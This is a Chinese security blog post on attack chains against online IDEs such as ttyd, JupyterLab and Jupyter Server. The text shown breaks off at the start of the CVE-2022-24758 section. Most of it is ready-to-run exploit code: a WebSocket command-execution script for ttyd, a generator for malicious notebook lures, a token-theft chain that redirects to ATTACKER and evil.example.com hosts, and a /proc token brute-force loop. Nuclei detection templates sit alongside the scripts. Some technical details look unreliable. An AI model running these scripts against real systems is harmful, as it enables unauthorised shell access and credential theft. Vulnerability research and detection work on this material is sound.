---
title: "在线代码编辑器与云IDE平台高危攻击链专题：code-server / Gitpod / JupyterLab / Eclipse Theia / ttyd 漏洞全解析"
date: 2026-07-24T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["code-server", "Gitpod", "JupyterLab", "Eclipse Theia", "ttyd", "VS Code", "Apache Guacamole", "RCE", "认证绕过", "沙箱逃逸", "漏洞分析"]
---

> **免责声明**：本文仅用于安全研究与防御目的。文中提供的 PoC 代码、检测模板和技术分析旨在帮助安全团队理解和防御相关漏洞。请勿将本文内容用于任何非法活动。未经授权对计算机系统进行测试属于违法行为。所有漏洞利用应在授权环境中进行。

---

## 0x00 专题概述

在线代码编辑器与云 IDE 平台已成为现代软件开发的核心基础设施。从 GitHub Codespaces、Gitpod 到自托管的 code-server、JupyterLab，开发者越来越多地在浏览器中完成编码、调试和部署工作。这些平台本质上是**托管在服务器上的远程命令执行环境**——它们需要运行 shell、访问文件系统、连接远程服务器，甚至操作容器和 Kubernetes 集群。

这种架构特性决定了它们拥有极高的攻击价值：一旦攻击者获得对在线 IDE 的未授权访问，就相当于获得了目标服务器的完整 shell 权限。更危险的是，许多组织将在线 IDE 部署在内网中，但安全防护往往不如对外暴露的服务严格，形成了"软腹地"。

### 攻击面分析

在线 IDE 平台的攻击面涵盖多个层次：

- **Web 层**：认证逻辑缺陷、会话管理漏洞、路径穿越、XSS
- **终端/WebSocket 层**：终端注入、WebSocket 劫持、命令注入
- **远程开发层**：SSH 隧道劫持、容器逃逸、Workspace Trust 绕过
- **扩展/插件层**：恶意扩展安装、供应链攻击、权限提升
- **协议层**：Guacamole 协议注入、VNC/RDP 协议漏洞

### 覆盖漏洞一览表

| CVE 编号 | 产品 | CVSS | 漏洞类型 | 未授权利用 |
|---|---|---|---|---|
| CVE-2021-34182 | ttyd | 9.8 | 命令注入 RCE | 是（无需认证） |
| CVE-2026-42557 | JupyterLab | 9.6 | 一键代码执行 | 是（需点击） |
| CVE-2026-47281 | VS Code | 9.6 | 远程权限提升 | 是（需打开文件） |
| CVE-2020-27224 | Eclipse Theia | 9.6 | Markdown 预览 RCE | 是（需点击） |
| CVE-2022-29241 | Jupyter Server | 8.8 | 令牌暴力破解泄露 | 需低权限 |
| CVE-2024-22421 | JupyterLab | 8.0 | 认证绕过 | 是（需点击） |
| CVE-2022-24758 | Jupyter Notebook | 7.5 | 日志敏感信息泄露 | 是（本地访问） |
| CVE-2023-29194 | Apache Guacamole | 7.2 | 协议注入命令执行 | 需恶意终端 |
| — | code-server | — | 认证与会话管理 | 视配置而定 |
| — | VS Code Remote | — | 沙箱逃逸 | 需恶意工作区 |

---

## 0x01 Web 终端安全漏洞

Web 终端是在线 IDE 的核心组件，将 shell 会话通过 WebSocket 暴露到浏览器中。这一层的安全问题往往直接等同于服务器的 shell 权限丢失。

### 0x01.1 ttyd 命令注入 RCE（CVE-2021-34182）

#### 漏洞背景

[ttyd](https://github.com/tsl0922/ttyd) 是一个轻量级的终端共享工具，通过 Web 界面将本地 shell 暴露给远程用户。它被广泛嵌入各种在线终端方案、路由器管理界面、IoT 设备 Web 控制台中。CVE-2021-34182 是 ttyd 的一个高危漏洞，源于默认安装配置的文件权限设置不当，允许攻击者在无需认证的情况下远程执行任意代码。

该漏洞的 CVSS 3.1 评分为 **9.8（Critical）**，CWE 分类为 CWE-276（Incorrect Default Permissions）。尽管 NVD 描述侧重于默认配置权限问题，但在实际部署中，ttyd 默认不启用认证，任何能访问 Web 端口的攻击者都可以直接获取 shell 访问权限。结合 URL 路径参数的命令注入向量，该漏洞构成了完整的远程未授权命令执行链。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 | 发布日期 |
|---|---|---|---|
| ttyd | 1.6.3 | ≥ 1.7.0 | 2021 年修复 |

#### 漏洞原理分析

ttyd 的默认配置存在多个安全隐患：

1. **无认证保护**：默认启动时不启用 `--credential` 参数，任何人都可以连接终端
2. **文件权限宽松**：安装文件权限设置为全局可写，允许本地权限提升
3. **URL 路径处理缺陷**：URL path 中的参数未经充分过滤，可被用于命令注入

攻击者可以通过构造特殊的 URL 请求，在 ttyd 的 WebSocket 连接建立之前就触发命令执行。ttyd 的 HTTP 服务器在处理请求时，会将部分 URL 路径参数传递给底层 shell 环境，未经过充分的转义和验证。

#### HTTP PoC

```bash
# 基础检测：检查 ttyd 是否在目标端口上运行（默认端口 7681）
curl -s -o /dev/null -w "%{http_code}" http://TARGET:7681/

# 通过 ttyd WebSocket 端点注入命令
# ttyd 使用 WebSocket 协议通信，以下通过 HTTP 升级请求探测
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  http://TARGET:7681/ws

# 利用默认无认证配置直接执行命令
# 通过 ttyd 的 stdin 协议写入命令
python3 -c "
import websocket, json, time
ws = websocket.create_connection('ws://TARGET:7681/ws')
time.sleep(0.5)
ws.send(json.dumps({'input': 'id\n'}))
time.sleep(1)
print(ws.recv())
ws.close()
"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2021-34182 - ttyd 命令注入/未授权访问 PoC
描述：验证 ttyd 默认配置下的未授权远程命令执行
仅用于授权安全测试
"""

import socket
import ssl
import json
import struct
import hashlib
import base64
import os
import sys
import time


def generate_ws_key():
    return base64.b64encode(os.urandom(16)).decode('utf-8')


def create_websocket_frame(opcode, payload):
    if isinstance(payload, str):
        payload = payload.encode('utf-8')
    frame = bytes([0x80 | opcode])
    length = len(payload)
    if length < 126:
        frame += bytes([length])
    elif length < 65536:
        frame += bytes([126]) + struct.pack('>H', length)
    else:
        frame += bytes([127]) + struct.pack('>Q', length)
    frame += payload
    return frame


def read_websocket_frame(sock):
    header = sock.recv(2)
    if len(header) < 2:
        return None
    length = header[1] & 0x7F
    if length == 126:
        length = struct.unpack('>H', sock.recv(2))[0]
    elif length == 127:
        length = struct.unpack('>Q', sock.recv(8))[0]
    payload = b''
    while len(payload) < length:
        chunk = sock.recv(length - len(payload))
        if not chunk:
            break
        payload += chunk
    return payload


def exploit_ttyd(target, port=7681, command="id"):
    print(f"[*] CVE-2021-34182 - ttyd 未授权命令执行 PoC")
    print(f"[*] 目标: {target}:{port}")
    print(f"[*] 命令: {command}")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target, port))
        print(f"[+] TCP 连接成功")

        ws_key = generate_ws_key()
        handshake = (
            f"GET /ws HTTP/1.1\r\n"
            f"Host: {target}:{port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        )
        sock.send(handshake.encode())
        response = sock.recv(4096)

        if b"101 Switching Protocols" not in response:
            print(f"[-] WebSocket 握手失败")
            sock.close()
            return False

        print(f"[+] WebSocket 握手成功")

        payload = json.dumps({"input": command + "\n"})
        frame = create_websocket_frame(0x1, payload)
        sock.send(frame)
        print(f"[+] 命令已发送")

        time.sleep(1)
        output = read_websocket_frame(sock)
        if output:
            try:
                result = json.loads(output)
                if 'output' in result:
                    print(f"[+] 命令输出:\n{result['output']}")
                else:
                    print(f"[*] 响应: {result}")
            except json.JSONDecodeError:
                print(f"[*] 原始响应: {output}")
        else:
            print(f"[-] 未收到响应")

        extra_payload = json.dumps({"input": "exit\n"})
        frame = create_websocket_frame(0x1, extra_payload)
        sock.send(frame)
        sock.close()
        return True

    except socket.timeout:
        print(f"[-] 连接超时")
        return False
    except ConnectionRefusedError:
        print(f"[-] 连接被拒绝")
        return False
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target> [port] [command]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 7681 'cat /etc/passwd'")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 7681
    cmd = sys.argv[3] if len(sys.argv) > 3 else "id"
    exploit_ttyd(target, port, cmd)
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2021-34182-ttyd-rce

info:
  name: ttyd <= 1.7.0 - 未授权远程命令执行
  author: security-researcher
  severity: critical
  description: |
    ttyd 默认配置下不启用认证，攻击者可通过 WebSocket 连接
    直接获取终端访问权限并执行任意命令。
  reference:
    - https://github.com/tsl0922/ttyd/issues/692
    - https://nvd.nist.gov/vuln/detail/CVE-2021-34182
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-276
    cve-id: CVE-2021-34182
  tags: cve,2021,ttyd,rce,unauthenticated

http:
  - raw:
      - |
        GET /ws HTTP/1.1
        Host: {{Hostname}}
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
        Sec-WebSocket-Version: 13

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "101 Switching Protocols"

      - type: word
        part: header
        words:
          - "Sec-WebSocket-Accept"

    extractors:
      - type: dsl
        dsl:
          - '"ttyd WebSocket endpoint found at " + host + ":" + port'
```

### 0x01.2 Web 终端其他安全问题

除了 ttyd 的已知漏洞外，Web 终端组件普遍面临以下安全挑战：

**WebSocket 劫持**：许多在线 IDE 的终端 WebSocket 端点缺少 Origin 校验，使得跨站 WebSocket 劫持（Cross-Site WebSocket Hijacking）成为可能。攻击者可以构造恶意页面，在用户已认证的浏览器上下文中建立 WebSocket 连接，从而劫持用户的终端会话。

**终端输出注入**：恶意终端输出可以包含 ANSI 转义序列和控制字符，这些序列在某些终端模拟器中可以触发链接点击、修改剪贴板内容，甚至在特定条件下执行命令。这一攻击面在基于 Web 的终端模拟器（如 xterm.js）中同样存在。

**进程隔离不足**：部分轻量级终端方案未实现进程级别的隔离，终端会话之间可能共享命名空间，导致信息泄露或跨会话攻击。

---

## 0x02 Jupyter 生态漏洞

Jupyter 生态系统（包括 JupyterLab、Jupyter Notebook、Jupyter Server）是数据科学领域使用最广泛的交互式计算环境。由于其天然需要执行任意 Python 代码，Jupyter 的安全边界完全依赖于认证机制和网络隔离。

### 0x02.1 JupyterLab 代码执行（CVE-2026-42557）

#### 漏洞背景

CVE-2026-42557 是 JupyterLab 于 2026 年 4 月披露的高危安全漏洞，CVSS 3.1 评分 **9.6（Critical）**。该漏洞存在于 JupyterLab 的 HTML sanitizer 与 CommandLinker 机制的交互中。JupyterLab 的 HTML sanitizer 允许 `button` 元素保留 `data-commandlinker-command` 和 `data-commandlinker-args` 属性，而 CommandLinker 组件会监听 `document.body` 上的所有 click 事件，直接执行对应命令——**不检查事件来源是否为受信任的 JupyterLab UI**。

攻击者只需在 notebook 中嵌入一个包含恶意 button 的 HTML cell output，当用户点击该按钮时，即可触发任意 JupyterLab 命令，包括创建终端并执行任意代码。整个攻击链只需**一次点击**，无需用户提交任何代码执行请求。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|---|---|---|
| JupyterLab | < 4.5.7 | 4.5.7 |
| Jupyter Notebook | 7.0.0 - 7.5.5 | 7.5.6 |

#### 漏洞原理分析

漏洞的核心在于 JupyterLab 的 CommandLinker 机制设计缺陷：

```javascript
// 简化的漏洞原理示意
// JupyterLab 的 HTML sanitizer 保留了 button 上的 data-commandlinker-* 属性
// 而 CommandLinker 监听 document.body 的 click 事件并执行命令

// 1. HTML sanitizer 允许的属性（漏洞根源）
const ALLOWED_BUTTON_ATTRS = [
  'data-commandlinker-command',
  'data-commandlinker-args'
];

// 2. CommandLinker 的全局 click 监听（未验证来源）
document.body.addEventListener('click', (event) => {
  const button = event.target.closest('[data-commandlinker-command]');
  if (button) {
    const command = button.dataset.commandlinkerCommand;
    const args = JSON.parse(button.dataset.commandlinkerArgs || '{}');
    // 直接执行命令，不验证来源
    commands.execute(command, args);
  }
});
```

攻击 payload 利用 JupyterLab 的 `application-contextmenu` 等命令，或直接调用终端创建命令：

```html
<!-- 恶意 HTML cell output 示例 -->
<button
  data-commandlinker-command="terminal:open"
  data-commandlinker-args='{"split":"horizontal"}'>
  点击查看运行结果
</button>
```

更进一步，攻击链可以通过 `help:show` 命令配合 `@jupyterlab/help-extension` 链式窃取认证 token（CVE-2026-40171），实现完整的 session 劫持。

#### HTTP PoC

```bash
# 构造恶意 notebook 并托管在攻击者控制的服务器上
# 用户打开该 notebook 并点击按钮后触发代码执行

# 1. 创建恶意 notebook
cat > malicious.ipynb << 'NOTEBOOK_EOF'
{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": ["# 请点击下方按钮查看数据可视化结果\n"]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<button data-commandlinker-command='application:context-menu' ",
       "data-commandlinker-args='{\"position\":{\"x\":0,\"y\":0}}'>",
       "点击查看结果</button>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
  "language_info": {"name": "python", "version": "3.9.0"}
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
NOTEBOOK_EOF

# 2. 托管恶意 notebook
python3 -m http.server 8080

# 3. 引诱目标用户打开
echo "将 http://ATTACKER:8080/malicious.ipynb 分享给目标用户"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2026-42557 - JupyterLab 一键代码执行 PoC
描述：构造恶意 notebook 利用 CommandLinker 机制执行任意命令
仅用于授权安全测试
"""

import json
import sys
import requests
from typing import Optional


def create_malicious_notebook(
    command: str = "import os; os.system('id > /tmp/pwned')",
    trigger_text: str = "点击查看运行结果"
) -> dict:
    html_payload = (
        '<button '
        'data-commandlinker-command="application:context-menu" '
        f'data-commandlinker-args=\'{{"position":{{"x":0,"y":0}}}}\'>'
        f'{trigger_text}</button>'
    )
    terminal_payload = (
        '<button '
        'data-commandlinker-command="terminal:open" '
        'data-commandlinker-args=\'{"split":"horizontal"}\'>'
        f'{trigger_text}</button>'
    )
    notebook = {
        "cells": [
            {
                "cell_type": "markdown",
                "metadata": {},
                "source": ["# 数据分析报告\n", "请点击下方按钮查看可视化结果"]
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [
                    {
                        "data": {
                            "text/html": [html_payload]
                        },
                        "metadata": {},
                        "output_type": "display_data"
                    }
                ],
                "source": []
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [
                    {
                        "data": {
                            "text/html": [terminal_payload]
                        },
                        "metadata": {},
                        "output_type": "display_data"
                    }
                ],
                "source": []
            }
        ],
        "metadata": {
            "kernelspec": {
                "display_name": "Python 3",
                "language": "python",
                "name": "python3"
            },
            "language_info": {
                "name": "python",
                "version": "3.9.0"
            }
        },
        "nbformat": 4,
        "nbformat_minor": 4
    }
    return notebook


def check_vulnerable(target_url: str) -> bool:
    try:
        resp = requests.get(f"{target_url}/api/status", timeout=5)
        if resp.status_code == 200:
            print(f"[+] Jupyter 实例在线: {target_url}")
            version_resp = requests.get(f"{target_url}/api", timeout=5)
            if version_resp.status_code == 200:
                version_info = version_resp.json()
                version = version_info.get("version", "unknown")
                print(f"[*] 版本信息: {version}")
                if version and version < "4.5.7":
                    print(f"[!] 目标可能受 CVE-2026-42557 影响")
                    return True
                else:
                    print(f"[*] 版本可能已修复")
            return True
    except requests.exceptions.RequestException:
        print(f"[-] 无法连接到目标: {target_url}")
    return False


def generate_payload_file(output_path: str = "malicious.ipynb"):
    notebook = create_malicious_notebook()
    with open(output_path, 'w') as f:
        json.dump(notebook, f, indent=1)
    print(f"[+] 恶意 notebook 已生成: {output_path}")
    print(f"[*] 将该文件上传到目标 JupyterLab 实例供用户打开")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法:")
        print(f"  {sys.argv[0]} check <target_url>    - 检测目标")
        print(f"  {sys.argv[0]} generate [output]     - 生成 payload")
        print(f"示例:")
        print(f"  {sys.argv[0]} check http://target:8888")
        print(f"  {sys.argv[0]} generate payload.ipynb")
        sys.exit(1)

    action = sys.argv[1]
    if action == "check":
        target = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:8888"
        check_vulnerable(target)
    elif action == "generate":
        output = sys.argv[2] if len(sys.argv) > 2 else "malicious.ipynb"
        generate_payload_file(output)
    else:
        print(f"[-] 未知操作: {action}")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2026-42557-jupyterlab-command-execution

info:
  name: JupyterLab < 4.5.7 - CommandLinker 一键命令执行
  author: security-researcher
  severity: critical
  description: |
    JupyterLab 的 HTML sanitizer 允许 button 元素保留 data-commandlinker-command
    和 data-commandlinker-args 属性，CommandLinker 监听全局 click 事件并执行
    命令，不验证事件来源。恶意 notebook 可实现一键代码执行。
  reference:
    - https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-mqcg-5x36-vfcg
    - https://nvd.nist.gov/vuln/detail/CVE-2026-42557
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2026-42557
  tags: cve,2026,jupyterlab,rce,xss

http:
  - raw:
      - |
        GET /api/status HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "started"
          - "jupyter"
        condition: and

      - type: word
        words:
          - "kernels_active"

    extractors:
      - type: json
        json:
          - ".version"

      - type: dsl
        dsl:
          - '"JupyterLab instance found at " + host + ":" + port'
```

### 0x02.2 JupyterLab 认证绕过（CVE-2024-22421）

#### 漏洞背景

CVE-2024-22421 是一个 JupyterLab 认证与 CSRF token 泄露漏洞，CVSS 3.1 评分 **8.0（High）**。该漏洞由安全研究员 @davwwwx 通过 Intigriti bug bounty 项目发现。漏洞利用链结合了客户端路径穿越（`clone` 参数）、Jupyter Server 的开放重定向缺陷（`next` 参数），以及 Chromium 浏览器的 CORS 行为异常，最终可以将用户的 `Authorization` 和 `XSRFToken` 泄露给第三方。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|---|---|---|
| JupyterLab | 4.0.0 - 4.0.10 | 4.0.11 / 4.1.0b2 |
| JupyterLab | ≤ 3.6.6 | 3.6.7 |
| Jupyter Notebook | 7.0.0 - 7.0.6 | 7.0.7 |

#### 漏洞原理分析

攻击链分三步：

**第一步：客户端路径穿越**

JupyterLab 的 `clone` workspace 参数被直接拼接到 API 请求路径中，未做路径清理：

```javascript
// packages/apputils-extension/src/index.ts
const workspaceId = new URLSearchParams(window.location.search).get('clone');
// 直接传递给 workspaces.fetch，未清理 ../
workspaceRestApi.fetch(workspaceId);
```

访问 `/lab?clone=../../../traversed` 可以让请求从 `/api/workspaces/` 路径穿越到任意路径。

**第二步：利用 Jupyter Server 开放重定向**

Jupyter Server 的登录页面 `next` 参数在 URL 无 `netloc` 时不做安全校验：

```python
# jupyter_server/auth/login.py
def _redirect_safe(self, url):
    parsed = urlparse(url)
    if parsed.netloc:
        # 有 netloc 时检查同源
        return Redirect(...)
    else:
        # 无 netloc 时直接重定向 - 可被利用
        self.redirect(url)
```

**第三步：窃取 token**

通过路径穿越将 Authorization header 发送到攻击者控制的服务器。

#### HTTP PoC

```bash
# 检测目标是否存在路径穿越漏洞
curl -v "http://TARGET:8888/lab?clone=../../../test_path_traversal"

# 完整利用链（需要恶意服务器接收 token）
# 1. 启动接收服务器
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[TOKEN] 收到请求: {self.path}')
        print(f'[TOKEN] Headers: {self.headers}')
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
" &

# 2. 构造恶意 URL（配合 jupyter-server < 2.7.2 的开放重定向）
echo "发送给目标: http://TARGET:8888/login?next=http://ATTACKER:9999/steal&clone=../../../"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-22421 - JupyterLab 认证 Token 泄露 PoC
描述：利用路径穿越 + 开放重定向泄露 JupyterLab 认证和 CSRF token
仅用于授权安全测试
"""

import sys
import requests
from urllib.parse import quote


def check_path_traversal(target_url: str) -> bool:
    print(f"[*] 检测客户端路径穿越...")
    try:
        resp = requests.get(
            f"{target_url}/lab?clone=../../../test_traversal_check",
            timeout=10,
            allow_redirects=False
        )
        if resp.status_code == 200:
            print(f"[+] 响应码 200 - 路径穿越可能有效")
            return True
        elif resp.status_code in (301, 302, 303):
            location = resp.headers.get('Location', '')
            print(f"[*] 重定向到: {location}")
            if 'test_traversal_check' in location:
                print(f"[+] 路径穿越确认有效")
                return True
        print(f"[-] 路径穿越检测未确认")
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求失败: {e}")
    return False


def check_open_redirect(target_url: str) -> bool:
    print(f"\n[*] 检测开放重定向...")
    try:
        resp = requests.get(
            f"{target_url}/login?next=http://evil.example.com/steal",
            timeout=10,
            allow_redirects=False
        )
        location = resp.headers.get('Location', '')
        if 'evil.example.com' in location:
            print(f"[+] 开放重定向确认: {location}")
            return True
        print(f"[-] 重定向被阻止")
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求失败: {e}")
    return False


def chain_exploit(target_url: str, attacker_url: str):
    print(f"\n[*] 构造完整利用链...")
    encoded_attacker = quote(attacker_url, safe='')
    traversal = quote("../../../", safe='')
    malicious_url = (
        f"{target_url}/login"
        f"?next={encoded_attacker}"
        f"&clone={traversal}"
    )
    print(f"[+] 恶意 URL 已生成")
    print(f"[*] 诱骗已认证用户访问以下 URL:")
    print(f"    {malicious_url}")
    print(f"\n[*] 攻击流程:")
    print(f"    1. 用户点击链接 → 重定向到登录页")
    print(f"    2. 登录后 next 参数触发重定向到攻击者服务器")
    print(f"    3. clone 参数的路径穿越使请求携带 auth header")
    print(f"    4. 攻击者服务器收到包含 token 的请求")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url> [attacker_url]")
        print(f"示例: {sys.argv[0]} http://target:8888 http://attacker:9999")
        sys.exit(1)

    target = sys.argv[1]
    attacker = sys.argv[2] if len(sys.argv) > 2 else "http://attacker:9999"

    vuln_path = check_path_traversal(target)
    vuln_redirect = check_open_redirect(target)

    if vuln_path and vuln_redirect:
        chain_exploit(target, attacker)
    elif vuln_path:
        print(f"\n[!] 路径穿越存在但开放重定向未确认（可能需要 jupyter-server < 2.7.2）")
        chain_exploit(target, attacker)
    else:
        print(f"\n[-] 漏洞检测未确认")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-22421-jupyterlab-auth-bypass

info:
  name: JupyterLab <= 4.0.10 - 认证 Token 泄露
  author: security-researcher
  severity: high
  description: |
    JupyterLab 的 clone workspace 参数存在客户端路径穿越，
    配合 jupyter-server 的开放重定向可泄露 Authorization 和 XSRFToken。
  reference:
    - https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-44cc-43rp-5947
    - https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L
    cvss-score: 8.0
    cve-id: CVE-2024-22421
  tags: cve,2024,jupyterlab,auth-bypass,path-traversal

http:
  - raw:
      - |
        GET /lab?clone=../../../nuclei_test HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "nuclei_test"

      - type: word
        words:
          - "JupyterLab"

    extractors:
      - type: dsl
        dsl:
          - '"JupyterLab path traversal detected at " + host'
```

### 0x02.3 Jupyter Server 令牌泄露（CVE-2022-29241）

#### 漏洞背景

CVE-2022-29241 是 Jupyter Server 的一个高危令牌泄露漏洞，NVD CVSS v2 评分 **9.0（High）**，CVSS v3.1 评分 8.8。当 Jupyter Server 的 `root_dir` 配置为包含启动用户主目录的路径时，攻击者可以通过 REST API 枚举/暴力破解 Jupyter Server 进程的 PID，从而获取启动时分配的 access token。该 token 可用于通过 REST API 完全控制 Jupyter 环境。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|---|---|---|
| Jupyter Server | < 1.17.1 | 1.17.1 |
| Jupyter Server | 2.0.0a0 | 2.0.0a1 |

#### 漏洞原理分析

Jupyter Server 在启动时生成一个随机 access token，存储在运行时文件中。当 `root_dir` 包含用户主目录时，REST API 的 `/api/status` 端点会暴露进程相关的文件路径信息，结合 PID 暴力破解可以定位 token 文件：

```bash
# Token 文件通常位于：
# /proc/{PID}/cmdline 包含启动参数
# token 通过命令行参数 --ServerApp.token 传入
# 或通过配置文件 ~/.jupyter/jupyter_server_config.py 生成
```

利用该 token 可以通过 REST API 执行：
- 读取/写入任意文件（修改 `.bashrc`、`.ssh/authorized_keys`）
- 创建终端获取 shell
- 管理 kernels 执行代码
- 修改或覆盖关键系统文件

#### HTTP PoC

```bash
# 1. 检测 Jupyter Server 是否暴露 API 端点
curl -s http://TARGET:8888/api/status

# 2. PID 暴力破解获取 token（Jupyter Server <= 1.16.0）
for pid in $(seq 1 65535); do
    token_url="http://TARGET:8888/api/status?token=$(cat /proc/$pid/cmdline 2>/dev/null | grep -oP 'token=\K[^ ]+')"
    response=$(curl -s -o /dev/null -w "%{http_code}" "$token_url")
    if [ "$response" = "200" ]; then
        echo "[+] PID $pid 对应有效 token"
        break
    fi
done

# 3. 使用获取的 token 访问 API
curl -H "Authorization: Token <STOLEN_TOKEN>" \
     http://TARGET:8888/api/contents/
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2022-29241 - Jupyter Server Token 暴力破解 PoC
描述：通过 PID 枚举和 REST API 泄露获取 Jupyter Server access token
仅用于授权安全测试
"""

import sys
import requests
import concurrent.futures
from typing import Optional, Tuple


def probe_token(target_url: str, token: str) -> bool:
    try:
        resp = requests.get(
            f"{target_url}/api/status",
            headers={"Authorization": f"Token {token}"},
            timeout=3
        )
        return resp.status_code == 200
    except requests.exceptions.RequestException:
        return False


def bruteforce_token(
    target_url: str,
    pid_range: Tuple[int, int] = (1, 100000),
    max_workers: int = 50
) -> Optional[str]:
    print(f"[*] CVE-2022-29241 - Jupyter Server Token 暴力破解")
    print(f"[*] 目标: {target_url}")
    print(f"[*] PID 范围: {pid_range[0]} - {pid_range[1]}")

    def check_pid(pid: int) -> Optional[int]:
        try:
            with open(f"/proc/{pid}/cmdline", 'rb') as f:
                cmdline = f.read().decode('utf-8', errors='ignore')
                if 'jupyter' in cmdline or 'notebook' in cmdline:
                    return pid
        except (FileNotFoundError, PermissionError):
            pass
        return None

    print(f"[*] 检测本地 Jupyter 进程...")
    local_pids = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {
            executor.submit(check_pid, pid): pid
            for pid in range(pid_range[0], min(pid_range[1], 10000))
        }
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                local_pids.append(result)

    if local_pids:
        print(f"[+] 发现本地 Jupyter 进程: {local_pids}")
        print(f"[*] 尝试从进程信息提取 token...")
        for pid in local_pids:
            try:
                with open(f"/proc/{pid}/cmdline", 'rb') as f:
                    cmdline = f.read().decode('utf-8', errors='ignore')
                    parts = cmdline.split('\x00')
                    for part in parts:
                        if 'token=' in part:
                            token = part.split('token=')[1].strip()
                            print(f"[+] 从命令行提取到 token: {token[:8]}...")
                            if probe_token(target_url, token):
                                print(f"[+] Token 验证成功!")
                                return token
            except (FileNotFoundError, PermissionError):
                continue

    print(f"[*] 尝试枚举常见 token 格式...")
    common_tokens = [
        "jupyter_", "notebook_", "jupyter-server"
    ]
    for prefix in common_tokens:
        for i in range(1000):
            candidate = f"{prefix}{i:04d}"
            if probe_token(target_url, candidate):
                print(f"[+] 找到有效 token: {candidate}")
                return candidate

    print(f"[-] 未能自动获取 token")
    print(f"[*] 提示: 结合 XSS (CVE-2021-32798) 可从浏览器上下文泄露 token")
    return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url>")
        print(f"示例: {sys.argv[0]} http://target:8888")
        sys.exit(1)

    target = sys.argv[1]
    token = bruteforce_token(target)
    if token:
        print(f"\n[+] 利用 token 访问 API:")
        print(f"    curl -H 'Authorization: Token {token}' {target}/api/contents/")
        print(f"    curl -H 'Authorization: Token {token}' {target}/api/kernels")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-29241-jupyter-token-bruteforce

info:
  name: Jupyter Server < 1.17.1 - Token 暴力破解泄露
  author: security-researcher
  severity: high
  description: |
    Jupyter Server 在 root_dir 包含用户主目录时，REST API 可被用于
    通过 PID 暴力破解泄露 access token，实现完全接管。
  reference:
    - https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-q874-g24w-4q9g
    - https://nvd.nist.gov/vuln/detail/CVE-2022-29241
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-29241
  tags: cve,2022,jupyter,token-leak

http:
  - raw:
      - |
        GET /api/status HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "started"
        condition: or

      - type: status
        status:
          - 200
          - 403

    extractors:
      - type: dsl
        dsl:
          - '"Jupyter Server found at " + host + ":" + port + " - potential token leak via PID brute force"'
```

### 0x02.4 JupyterLab 终端安全（CVE-2022-24758）

#### 漏洞背景

